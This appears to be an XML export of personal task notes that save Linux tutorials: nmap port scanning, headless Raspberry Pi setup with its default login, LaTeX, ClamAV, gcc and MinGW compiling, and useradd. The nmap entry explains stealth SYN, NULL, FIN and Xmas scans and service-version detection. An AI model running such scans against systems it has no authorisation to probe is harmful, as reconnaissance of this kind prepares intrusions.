Note: If you have the McAfee firewall, you'll also have to enable UDP-control. If it isn't enabled, all UDP-datagrams are ignored. </COMMENTS><TASK ID="218" TITLE="https://www.digitalocean.com/community/tutorials/how-to-use-nmap-to-scan-for-open-ports-on-your-vps" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42390.00000000" STARTDATESTRING="1/21/2016" CREATIONDATE="42390.96768519" CREATIONDATESTRING="1/21/2016 11:13 PM" LASTMOD="42390.96814815" LASTMODSTRING="1/21/2016 11:14 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>You can quickly discover which services you are running by issuing the command with the following parameters:

sudo netstat -plunt


Scan for the host operating system:

sudo nmap -O remote_host

Skip network discovery portion and assume the host is online. This is useful if you get a reply that says "Note: Host seems down" in your other tests. Add this to the other options:

sudo nmap -PN remote_host

Specify a range with "-" or "/24" to scan a number of hosts at once:

sudo nmap -PN xxx.xxx.xxx.xxx-yyy

Scan a network range for available services:

sudo nmap -sP network_address_range

Scan without preforming a reverse DNS lookup on the IP address specified. This should speed up your results in most cases:

sudo nmap -n remote_host

Scan a specific port instead of all common ports:

sudo nmap -p port_number remote_host

To scan for TCP connections, nmap can perform a 3-way handshake (explained below), with the targeted port. Execute it like this:

sudo nmap -sT remote_host

To scan for UDP connections, type:

sudo nmap -sU remote_host

Scan for every TCP and UDP open port:

sudo nmap -n -PN -sT -sU -p- remote_host

A TCP "SYN" scan exploits the way that TCP establishes a connection.

To start a TCP connection, the requesting end sends a "synchronize request" packet to the server. The server then sends a "synchronize acknowledgment" packet back. The original sender then sends back an "acknowledgment" packet back to the server, and a connection is established.

A "SYN" scan, however, drops the connection when the first packet is returned from the server. This is called a "half-open" scan and used to be promoted as a way to surreptitiously scan for ports, since the application associated with that port would not receive the traffic, because the connection is never completed.

This is no longer considered stealthy with the adoption of more advanced firewalls and the flagging of incomplete SYN request in many configurations.

To perform a SYN scan, execute:

sudo nmap -sS remote_host

A more stealthy approach is sending invalid TCP headers, which, if the host conforms to the TCP specifications, should send a packet back if that port is closed. This will work on non-Windows based servers.

You can use the "-sF", "-sX", or "-sN" flags. They all will produce the response we are looking for:

sudo nmap -PN -p port_number -sN remote_host

To see what version of a service is running on the host, you can try this command. It tries to determine the service and version by testing different responses from the server:

sudo nmap -PN -p port_number -sV remote_host

There are many other command combinations that you can use, but this should get you started on exploring your networking vulnerabilities.</COMMENTS></TASK></TASK><TASK ID="211" TITLE="http://mvartan.com/2013/02/10/setting-up-a-headless-raspberry-pi/" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42387.00000000" STARTDATESTRING="1/18/2016" CREATIONDATE="42387.01851852" CREATIONDATESTRING="1/18/2016 12:26 AM" LASTMOD="42387.01869213" LASTMODSTRING="1/18/2016 12:26 AM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0" SUBTASKDONE="0/2"><COMMENTS>

A headless raspberry pi is a raspberry pi that is not hooked up to a monitor, a keyboard, or a mouse. It is pretty easy to set a raspberry pi up and then remove the peripherals, but this guide is for those who do not want to take their setups apart to set up their raspberry pi.
Things you will need

    A Raspberry Pi. They should sell as low as $35 on some websites, but if you need it quickly, it will be in stock at amazon. Make sure to have a Micro-USB cable and USB power adapter handy as well.

    An SD Card. I recommend getting a Class 10 SD Card for the fastest speeds. The small ones go for as little as 5 dollars.

    SSH. If you are using Windows, I recommend using PuTTy. You can also SSH using apps on your smartphone or tablet.

    A VNC viewer/client. I recommend TightVNC for your PC. You can also find VNC clients for your smartphone or tablet

    Ethernet connection.

    (optional) WiFi adapter. I bought the Edimax Wireless Nano USB Adapter and have had no issues.

Downloading raspbian

First, download Raspbian, the primary operating system for the Raspberry Pi, and write it to the SD card. If you are using Windows, use Win32DiskImager. After the image is written to your SD card, pop it into your Raspberry Pi

Connect your Raspberry Pi to Ethernet, and power it up. Meanwhile, log in to your WiFi router to find all of the clients connected to it.

You should be able to find your raspberry pi’s local IP address

Find your Raspberry Pi's IP through your router's web interface
Find your Raspberry Pi's IP through your router's web interface
Logging into your pi

Now, ssh into your Raspberry Pi, in port 22. The default login is:

Username: pi

Password: raspberry

I suggest you first change your password and set up your pi by typing sudo raspi-config Then, update your raspberry pi by sudo apt-get upgrade.

Accessing your Desktop Environment

If you do not need to ever use a desktop environment, you are done! Otherwise, read on.

The next thing we need to do is install a VNC server. VNC stands for “Virtual Network Computing”, and allows you to view your computer screen remotely. Type the command: sudo apt-get install tightvncserver

Now we have a VNC server installed!

Raspberry Pi Desktop on VNC
Raspberry Pi Desktop on VNC

I prefer to leave VNC off until I need it, so that the Raspberry Pi doesn’t maintain a desktop environment unless I need it, saving processing power. When I need to view the desktop, I type this command in ssh: tightvncserver -geometry 1366×768 (change the resolution as desired)

This will create a server, usually on port 1. It may ask you for a password on the first time, it must be less than 8 characters.

Then, just log into your VNC viewer and put in your server details and login credentials.

If you want to close the VNC server, type tightvncserver -kill :[port] (where [port] is most likely 1)

Now you have your headless raspberry pi set up!
Adding WiFi (optional)

Plug your WiFi dongle into a USB port of the Raspberry Pi. On the desktop, you should see WiFi Config. If not, go to Start→Other→wpa_supplicant user interface.

Click Scan and configure your network.</COMMENTS><TASK ID="212" TITLE="tightvncserver -geometry 1366×768" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42387.00000000" STARTDATESTRING="1/18/2016" CREATIONDATE="42387.01902778" CREATIONDATESTRING="1/18/2016 12:27 AM" LASTMOD="42387.01917824" LASTMODSTRING="1/18/2016 12:27 AM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>This will create a server, usually on port 1.

 Using xdvi

xdvi is a DVI file post-processor which generates its output in an X window. All that is necessary to start it up is the command


        xdvi &lt;filename&gt;.dvi

In this case the .dvi filename extension may be omitted, as xdvi assumes that the extension is present. In keeping with other X applications, after a few seconds a flickering outline of the previewer window will appear. Positioning of this window is done in the usual manner. The first page of the document appears in this window. By positioning the mouse pointer at a required point within the window and holding down either the left mouse button, the right mouse button, or both mouse buttons simultaneously, gives varying degrees of magnification of that section of the document. This allows the close inspection of parts of a document as well as being able to see its full-page appearance. To exit from the xdvi previewer, simply type q to the window.

More extensive information is available from the xdvi manual pages and the next section provides a summary of the main options available. In particular, and in common with the majority of X applications, xdvi accepts a large range of X default settings, described in the manual page, with which the user may tailor the program's behaviour. The behaviour seen by the casual user is just the `default default' configuration, so to speak. </COMMENTS><CUSTOMCOMMENTS>WAcAAHiclVVNj9s2EO05QP7D3AIEjiD522gRIEEvORQIijTIQYfS0lBmliK1JGWvsdj/3pmhbG8WRYDsgbSoN49v3sxoH+uQdFUrF40szdBV89W8blHrsnZ+NI3vB5X4wCrXVeVi8Vhr71LaW/pR1toZW+vmoELEVMKHYJT9/enp9avH+m3docOgkg/wt2kO2M5LWBeLYrcuy6f6aPB0Z1y7rMemgtev6kGFtk4Pi3lJ63rJKyFpreZb2SiMt50A5nNBzFcCmW8FQrGyrQSy2ApkWQlkuRQIrbytKoGslgJZbQSyLrfT3bJtBLIpBbJZCGSzFgiRyJbFbrPabZa7y3J3We4uy61K1qtjtYYvHvDBJNDB95AOCA/t0cAQkB3BMINo+sGeIZ0HhHoP9/W+BEhesCdyzJ8KNitbdlnhn2hcJ1zPj4XbRFDw59dPoI1FGHxM74bgG4yRSnM6UG1gKhVGMCmCH9MwJjAOlINvl0vhg7UkQiUmdMjxKpxZWUwq0GmCceB3LJQap1eu/R+h058o+4MVOdXj++KF8E+OaIirURGFkAFwgZODCalhvYNenWGP4HuTErYzUDFTqxjHHmMWzAS3EKIluyO6VADdc4c4sHcnkw7gCRooZzUM1jQqET4SqU50qkDjCSI23rVsqSbEHQaOJcescSRDy13Xak7e0UbeESeqUMBnHw0TS6DOeU44+tV64jFOeMY4KkspOqpOAV/oRJsQEwyqu97V+oYSdWmijzn2SlnAxzPX/Hojx/R+jNwJxkleFAsB70cTsM2nYsYkYpJG1YSDty1z0LMDNOIVQyzqNJHux5S8m8lxMN3h5Tm13J5M/uE0cs+PNimHdGrPM+jMkWp3pP6S67ALSM+Uca86Z/RUmWwByaea3J5vlrBl3PzW+tPUltZHdjcOtwjqtyTc6pmXZB9yySI1F0tQexodbnVEGRE9WvtOypBtV67B4tdm+/4nQ/2XD9eOPbJg7UOfc+aEjspYUfTjRdQo3C8sK0q9+I0jmqtBNPdH0/JboPHoeX4nz3pF5faDNPztAhkQNsg0o1WUALMSkMeb6GRkcvR3H0wStpfDk8exaXBIfC/RkGtkWG7hb1Rdraj4pDElspoiSGATzB7byxw8S2yWL82frTwj1IT8FUik2Ydp/nwXVP+Gq3dQR+PHaXyuj1xIB/tz7golcyZMZO/3MeZPxr8XadP+hvJ22nRjkNyonF56ghrgroBcOfrf99t/eE6T3QAAAAAA</CUSTOMCOMMENTS><TASK ID="265" TITLE="http://stackoverflow.com/questions/1017055/get-started-with-latex-on-linux" REFID="0" COMMENTSTYPE="849cf988-79fe-418a-a40d-01fe3afcab2c" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42416.00000000" STARTDATESTRING="2/16/2016" CREATIONDATE="42416.87142361" CREATIONDATESTRING="2/16/2016 8:54 PM" LASTMOD="42416.87175926" LASTMODSTRING="2/16/2016 8:55 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>

First you'll need to Install it:

    If you're using a distro which packages LaTeX (almost all will do) then look for texlive or tetex. TeX Live is the newer of the two, and is replacing tetex on most distributions now.

    If you're using Debian or Ubuntu, something like:

    apt-get install texlive

    ..will get it installed.

    RedHat or CentOS need:

    yum install tetex

Next you'll need to get a text editor. Any editor will do, so whatever you are comfortable with. You'll find that advanced editors like Emacs (and vim) add a lot of functionality and so will help with ensuring that your syntax is correct before you try and build your document output.

Create a file called test.tex and put some content in it, say the example from the LaTeX primer:

\documentclass[a4paper,12pt]{article}
\begin{document}

The foundations of the rigorous study of \emph{analysis}
were laid in the nineteenth century, notably by the
mathematicians Cauchy and Weierstrass. Central to the
study of this subject are the formal definitions of
\emph{limits} and \emph{continuity}.

Let $D$ be a subset of $\bf R$ and let
$f \colon D \to \mathbf{R}$ be a real-valued function on
$D$. The function $f$ is said to be \emph{continuous} on
$D$ if, for all $\epsilon &gt; 0$ and for all $x \in D$,
there exists some $\delta &gt; 0$ (which may depend on $x$)
such that if $y \in D$ satisfies
\[ |y - x| &lt; \delta \]
then
\[ |f(y) - f(x)| &lt; \epsilon. \]

One may readily verify that if $f$ and $g$ are continuous
functions on $D$ then the functions $f+g$, $f-g$ and
$f.g$ are continuous. If in addition $g$ is everywhere
non-zero then $f/g$ is continuous.

\end{document}

Once you've got this file you'll need to run latex on it to produce some output (as a .dvi file to start with, which is possible to convert to many other formats):

latex test.tex

This will print a bunch of output, something like this:

=&gt; latex test.tex

This is pdfeTeX, Version 3.141592-1.21a-2.2 (Web2C 7.5.4)

No file test.aux.
[1] (./test.aux) )
Output written on test.dvi (1 page, 1508 bytes).
Transcript written on test.log.

..don't worry about most of this output -- the important part is the Output written on test.dvi line, which says that it was successful.

Now you need to view the output file with xdvi:

xdvi test.dvi &amp;

This will pop up a window with the beautifully formatted output in it. Hit `q' to quit this, or you can leave it open and it will automatically update when the test.dvi file is modified (so whenever you run latex to update the output).

To produce a PDF of this you simply run pdflatex instead of latex:

pdflatex test.tex

..and you'll have a test.pdf file created instead of the test.dvi file.

After this is all working fine, I would suggest going to the the LaTeX primer page and running through the items on there as you need features for documents you want to write.

Future things to consider include:

    Use tools such as xfig or dia to create diagrams. These can be easily inserted into your documents in a variety of formats. Note that if you are creating PDFs then you shouldn't use EPS (encapsulated postscript) for images -- use pdf exported from your diagram editor if possible, or you can use the epstopdf package to automatically convert from (e)ps to pdf for figures included with \includegraphics.

    Start using version control on your documents. This seems excessive at first, but being able to go back and look at earlier versions when you are writing something large can be extremely useful.

    Use make to run latex for you. When you start on having bibliographies, images and other more complex uses of latex you'll find that you need to run it over multiple files or multiple times (the first time updates the references, and the second puts references into the document, so they can be out-of-date unless you run latex twice...). Abstracting this into a makefile can save a lot of time and effort.

    Use a better editor. Something like Emacs + AUCTeX is highly competent. This is of course a highly subjective subject, so I'll leave it at that (that and that Emacs is clearly the best option :)

ClamAV

There aren't many viruses made for Linux distributions and as such, most people who use such systems don't ever bother using an antivirus software. Those however who do want to be able to scan their system or other windows-based systems that are connected on a Linux PC through a network, they can use ClamAV. ClamAV is an open source anti-virus engine that is built to detect viruses, trojans, malware and other threats. It supports multiple file formats (documents, executables or archives), utilizes multi-thread scanner features and receives updates for its signature database at least 3-4 times a day.

The first step is to install and get the latest signature updates. To do this on Ubuntu, you can open a terminal and insert “sudo apt-get install clamav” and press enter.

sudo apt-get install clamav

You may also build ClamAV from sources to benefit from better scanning performance. To update the signatures, you type “sudo freshclam” on a terminal session and press enter.

sudo freshclam

Now we are ready to scan our system. To do this, you can use the “clamscan” command. This is a rich command that can work with many different parameters so you'd better insert “clamscan –-help” on the terminal first and see the various things that what you can do with it.

clamscan –-help

So, I will demonstrate a scan on my “Downloads” folder located under the home directory and I will choose to output only infected files and ring a bell when (and if) they are found. This translates to the following command on the terminal: “clamscan -r –bell -i /home/bill/Downloads”.

clamscan -r –bell -i /home/bill/Downloads

To scan the whole system (it may take a while) and remove all infected files in the process, you can use the command in the following form: “clamscan -r –remove /”. Sometimes, simply removing infected files can cause even more problems or breakages. I suggest that you should always check the output first and then take manual action. Alternatively, you may also use the “move” command integrated as a parameter in the form of” “--move=/home/bill/my_virus_collection” (example directory).
ClamTK

If all this console stuff is simply too much for you, you can also install an additional package called “clamtk” that is basically a gtk-2 GUI for ClamAV.

sudo apt-get install clamtk

From the ClamTK top panel options menu, you can choose any directory or file to scan, specify whitelisted directories and manage quarantined files. You may also elect to perform quick or recursive scans, or even check a device such as a USB stick.

ClamTK's scheduler also allows for the easy setting up of scheduled scans as well as scheduled antivirus signature database updates (you'd better set the latter before the former). Moreover, if you find a file that is falsely marked as a threat, you can submit it for further analysis to the ClamAV team, directly from the ClamTK interface.

While I didn't perform speed comparison tests between the console and GUI scans, I didn't notice any significant difference on the time. ClamTK is definitely simplifying the process, so I suggest that you install it along with ClamAV as well.</COMMENTS><CUSTOMCOMMENTS>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</CUSTOMCOMMENTS></TASK></TASK><TASK

http://www.codecoffee.com/tipsforlinux/articles/18.html

This article is for those guys who used to write a lot of programs under Windows.. and now have entered the Linux territory. You have probably heard a lot about Linux and how you can do some real good programming under Linux. But right now you cant even get the simplest of Hello World programs to compile.
Here's how you do it -


Procedure :

You can type you C program using any of the editors that are available under Linux such as vi or emacs or any other editor. My favourite is Emacs and I have explained how to get started with Emacs in Article No. 12

Once you have written and saved your C program using any editor return to the prompt. An ls command should display your C program. It should have the .c extension. Now at the prompt type the following

$ gcc -o firstprogram firstprogram.c

If your file is named firstprogram.c then type '-o firstprogram' as the parameter to gcc. This is basically your suggested name for the executable file that gcc would create. In case you typed something like the following

$ gcc firstprogram.c

You would be having a a.out in the same directory as the source C file. This is the default name of the executable that gcc creates. This would create problems when you compile many programs in one directory. So you override this with the -o option followed by the name of the executable

$ gcc -o hello secondprogram.c

Would create an executable by the name hello for your source code named secondprogram.c

Running the executable that you created is as simple as typing the following at the prompt.

$ ./firstprogram
OR
$ ./hello

Or whatever you named your executable.

This is the absolute basics of compiling C programs under Linux. Watch out for the articles that shall explain multiple file program compilation using make and other such tools.</COMMENTS><CUSTOMCOMMENTS>twkAAHicjVZLa+Q4EN5zIP+hDgOBhXG7n+lMTrNhYQL7IrsQBnxRy7ItIktGkttphvz3rSrZiZPJDgvBdneXqr5HVTnfCh+rZSFs0HyRXb1cbVdFqaoqL6zrtXRtJyJ9YYStl/l6/a2onI3xYPAhLyqrTVHJRvigYg6fvRbm+unp/OxbIZ1xHuPguvCqzIvaK2Xz4mB6tdpurznm56JWVnkRnYc7LRtVrnLYZevsapfnT8VRq+FB23JT9HIJ52dFJ3xZxMf1KsfrbkNXjMTrcrXnGx6j2xUHrFYcsdpyyGrPIXiWb1sOWe85ZLPkkM2GQ/BKt+2SQ7YbDtlecsgu34+1+XbJIZc5h1yuOeRyxyGYhG8J7D6h3Se4VwnuVYJ7leAuc8JbheUOPkAtJXx0UGkfYudd7UX76kMmSYwkyflZE2P3abEYhiGTrlTSVZVS+Nguou5C5bzRtn9cCB+1NCoslvusia2Zp/in0QHGAMBHPASxcUFB3Z8CDI2DPqgSooPB66hAgHERXAUjogC9LZWHezTMDSHLQNgSrBugEUcFykbl6Xyj4DdCA/gZEzl/yuCr61MU5jqIgzlBo9DqsYY4uD6OhyhngzlPeEIKC6WD4FoFXgkDtXPlBKfVth4R8ckMfsEkXtdNZFBjggjqqCzUKjKyoNsOBWJeX5QxDu5RvPKFI9KnmdBGZUm3L8jqIjxjQjw6wse5sun6l3dSlb1X8Gn+9deRRzx1ihPcTLVQbqIg7InAEDhVklyIoREoCmYSR6ENyqXmRCH0sgER4KgBPVStkIEeOBGm8WOeDH4/QSWOrmc70fJfOZQUvh09e+yM0FYlyZE6yRQidgl+NejYjEe0xclPnfOHy2C5mjP808rEjFNS70QUnKoE/KKkn/y7rBNMdDb23lJ10gDD2i5m8NmCCWRFy5ka16NLpQ4I+PQmZQa3cYpgDJQnk8gOgQTtbIaoBxBxViD5QZ8rh10wIKY5pw9QHP7PiB7y+anbKiGrdBoxK1rk//oI1Ry74eJN8gsylSEK/KRwfNgSKTPg4cW/g8AlLowZJQh9XWMzYxEqNY402apkH7lvGAr3E7EZWCOJsxQVqmaxM0PyjgCVPGmxIX+MfvihPJTtv9cVNX2qdVBkCTsOIqMxx17iQSTApfZK0oaYmAdkhd10w7hfaNNP+IoSvYmJ6TQwL0SfOSZ2YTw8Z8zLx6iWlh16wAsijTq01I/POwAhOjtDl8HfjsPdkVZaSdUoNw0IwUAfXRex0Ua1UMnDiX95H+z3UmKGhrdRwN1uy3dFvZ9TwY0yIz+vlvJQK6QWSYrSW2Psxx+UuOutJa/e05bl4uIlWYKGpV3K1p266dhzv7yet+w152wxb55xj9y9/MokXi0Zj6ZhbTSAkSQqzPAFaPbd+27sHXEIzvQoG89PIEeS84Tz5u0Lbnyd3IuIe5Zadpqr6fWaBAkNDuK0QqHF3tTdNHHTukhVBPdGWnyteFC8HNOq5l0enTNhBI//Nv30L7ZpZFoA</CUSTOMCOMMENTS><TASK ID="261" TITLE="http://www.cplusplus.com/forum/unices/70416/" REFID="0" COMMENTSTYPE="849cf988-79fe-418a-a40d-01fe3afcab2c" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42415.00000000" STARTDATESTRING="2/15/2016" CREATIONDATE="42415.89075231" CREATIONDATESTRING="2/15/2016 9:22 PM" LASTMOD="42415.89305556" LASTMODSTRING="2/15/2016 9:26 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>Cross-compiling from linux, especially if you're using a debian based distribution like Ubuntu, is a piece of cake! You just need to install minGW first...
sudo apt-get install mingw32
Then write code like you normally would, using standard libraries only (iostream, vector, string, cstdio/lib, etc.) Compiling on linux is the same as it always is:
g++ -s -o output main.cpp
Edit &amp; Run

and then to produce a Windows executable...
i586-mingw32msvc-g++ -s -o output.exe main.cpp
Edit &amp; Run

Don't worry about trying to remember the minGW compiler's long name. Typing i5, then hitting tab, and then typing g++ will fill it out for you. Remember that only the standard libraries are portable. If you try to build something using unistd.h, or if you wanted to functionality only available from windows.h, you're out of luck.

Note that executables produced by minGW will be fairly large (about half a megabyte if you use the -s flag). This is because all of the libraries that might be dynamically linked when built with g++ or in visual studio, are built into the executable. This means that the .exe minGW builds will run on all Windows systems without other dependencies, where executables built by visual studio typically don't work correctly without installing a run time on the client's system. </COMMENTS><CUSTOMCOMMENTS>0wYAAHicjVVNb9w2EO3ZgP/D9FInjVbVar/bU5EWRS89GC6CALpQ1EiarkQK/FhZMPzfOyTXsdNceiG1qzczb948Uk+Vce26EspSXOTUrctdWTXYtkWltCepx0m48McgVLcuNpunqtXKuXrgh6JqFQ1VK3thLLoCfjUkhl+en29vnqofqw4VGuG0gXuSPTZlAft8k5/2RfFcXQjnM6lmW3m5htubahKmqdzjpix43W/Dykhe1+UxbhwWtlMElGVElLsIKY8RwrFx20XI5hgh23WEbLcRwmvYdusI2W0jZHeIkH1xvNaO2yFCDkWEHDYRcthHCCeJWyJ7TGyPie4p0T0luqdEd10Evq1d7+Gj0daugrA0kOqgNXoEfvKPGaCdULKEwwLUwqL9nUHwNsAENFiTUFALiw00ZJ2h2jvSiqPPCH/XXjmfAVnGToQSQbcgxRm/h8/awz/eOlDIsU4DKeu4DIyk/vgELRnr8jwPM7i9sb7RICa36tC9BXbzpkyIhx4VzIYcgtQNpvrMFpQ2Y2Q/az802ZU6Z1ANT5dxtRGG0IJWDHpHmptAMWZwQck+ySA0pboMpHUN6Z84gEVxMn8PH78IFhtmuUKnrkewYkQQFsiBGGax8JP9ORHtPnyAlYWVBu3d5B2MglQupym9/r3hmB/g3qv0O61MNuRVQafJ6MazkgI+sVf1bAEfUXon6gG/CEa74351FWi0F7n6b9mcg/5X6d+0unMsnjELiJqDwZkl9MxUDI441mhiz2luyURo7iwMmlGKlcirGuBhmUIU7bLUSU/OxTSC9XztL6EC25l4xm1YmFao2/Kp5YlytgLg/rW0cGl2Ufhv5yrYr5M2SR/4M3o49BAaqD0NDVg9outD3WQOr9jJTd5nwBWT6WEWyiWftl7JYHExkFtSZXERNIT86eTMaS4hwfW8BPrs/MHLc/5W3L80+zV28DpD+zLhBurlqmrUoub0ggzXG4TpEN6lcfRiaNkMI3aiXjjdlbC3GBXhofNF2b3P4aGn4EPOI0V4G84QkwqgV7UimZG63oV6zcLzIxnPDxv8zJzmMKagG5uCXB9HFWRScCHrxcAj8HxOsqh7wpFi2UKZN0ZNbEbkOz7VDO+TKWPHcTI2NW68Cics8H2xvF2sw9FGClFcDjd8HU2oGlSSO8kCU4NfCZvosKpfUY2mSz02L2Y/s5GN4RsgXBzXGtd7J918gZMjPuVMLFCXA6Fydy/MckgD5s/Od/8CQ+ddngAA</CUSTOMCOMMENTS></TASK><TASK ID="349" TITLE="http://stackoverflow.com/questions/8671366/undefined-reference-to-pow-and-floor" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="10" RISK="0" PERCENTDONE="0" STARTDATE="42592.00000000" STARTDATESTRING="8/10/2016" CREATIONDATE="42592.85203704" CREATIONDATESTRING="8/10/2016 8:26 PM" LASTMOD="42592.85206019" LASTMODSTRING="8/10/2016 8:26 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="255" PRIORITYWEBCOLOR="#FF0000"/><TASK ID="277" TITLE="http://stackoverflow.com/questions/5237482/how-do-i-execute-external-program-within-c-code-in-linux-with-arguments" REFID="0" COMMENTSTYPE="849cf988-79fe-418a-a40d-01fe3afcab2c" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42417.00000000" STARTDATESTRING="2/17/2016" CREATIONDATE="42417.88842593" CREATIONDATESTRING="2/17/2016 9:19 PM" LASTMOD="42417.88942130" LASTMODSTRING="2/17/2016 9:20 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>Use system():

We all are aware about the most popular command called ‘useradd‘ or ‘adduser‘ in Linux. There are times when a Linux System Administrator asked to create user accounts on Linux  with some specific properties, limitations or comments.

In Linux, a ‘useradd‘ command is a low-level utility that is used for adding/creating user accounts in Linux and other Unix-like operating systems. The ‘adduser‘ is much similar to useradd command, because it is just a symbolic link to it.
add users in linux

useradd command examples

In some other Linux distributions, useradd command may comes with lightly difference version. I suggest you to read your documentation, before using our instructions to create new user accounts in Linux.

When we run ‘useradd‘ command in Linux terminal, it performs following major things:

    It edits /etc/passwd, /etc/shadow, /etc/group and /etc/gshadow files for the newly created User account.
    Creates and populate a home directory for the new user.
    Sets permissions and ownerships to home directory.

Basic syntax of command is:

useradd [options] username

In this article we will show you the most used 15 useradd commands with their practical examples in Linux. We have divided the section into two parts from Basic to Advance usage of command.

    Part I: Basic usage with 10 examples
    Part II: Advance usage with 5 examples

Part I – 10 Basic Usage of useradd Commands
1. How to Add a New User in Linux

